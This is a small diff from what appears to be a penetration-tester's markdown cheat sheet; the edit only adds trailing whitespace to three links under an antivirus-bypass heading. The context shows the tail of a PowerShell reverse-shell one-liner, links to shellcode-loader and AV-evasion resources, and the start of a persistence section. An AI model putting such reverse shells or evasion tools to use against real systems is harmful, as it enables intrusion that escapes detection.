@@ -92,9 +92,9 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # BypassAV
 
-<https://github.com/TideSec/BypassAntiVirus>
-<https://github.com/clinicallyinane/shellcode_launcher>
-<https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html>
+<https://github.com/TideSec/BypassAntiVirus>    
+<https://github.com/clinicallyinane/shellcode_launcher>    
+<https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html>    
 
 # Persistence
 ```command
